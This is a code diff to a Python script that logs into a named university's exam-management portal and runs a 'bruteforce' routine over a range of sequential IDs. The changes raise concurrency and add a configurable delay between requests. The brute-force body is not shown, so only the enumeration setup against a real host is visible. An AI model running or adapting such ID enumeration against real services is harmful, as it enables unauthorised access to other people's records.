@@ -5,9 +5,9 @@ from gevent.pool import Pool
 from gevent.queue import Queue
 from pyquery import PyQuery as pq
 from urlparse import parse_qs
+from time import sleep
 import requests
-import ConfigParser
-import os.path
+import os.path, ConfigParser
 
 
 config = ConfigParser.ConfigParser()
@@ -30,6 +30,7 @@ if os.path.isfile('config.ini'):
   rng = int(config.get('BRUTEFORCE', 'range'))
   pa = int(config.get('BRUTEFORCE', 'parallel_auths'))
   pr = int(config.get('BRUTEFORCE', 'parallel_requests'))
+  slt = float(config.get('BRUTEFORCE', 'sleep'))
 
   url = 'https://qis.fh-rosenheim.de/qisserver/'
   auth_url = url + 'rds?state=user&type=1&category=auth.login'
@@ -87,8 +88,9 @@ def check_config():
     config.set('IDS', 'konto', '')
     config.set('BRUTEFORCE', 'start_id', '1873537')
     config.set('BRUTEFORCE', 'range', '1000')
-    config.set('BRUTEFORCE', 'parallel_auths', '2')
-    config.set('BRUTEFORCE', 'parallel_requests', '2')
+    config.set('BRUTEFORCE', 'parallel_auths', '5')
+    config.set('BRUTEFORCE', 'parallel_requests', '10')
+    config.set('BRUTEFORCE', 'sleep', '0.05')
     with open('config.ini', 'w') as configfile:
       config.write(configfile)
     print('Creating config.ini! Please setup and rerun!')
@@ -100,4 +102,5 @@ if __name__ == "__main__":
   if check_config():
     init_queue()
     for i in range(startId, startId + rng):
+      sleep(slt)
       pool.spawn(bruteforce, i)
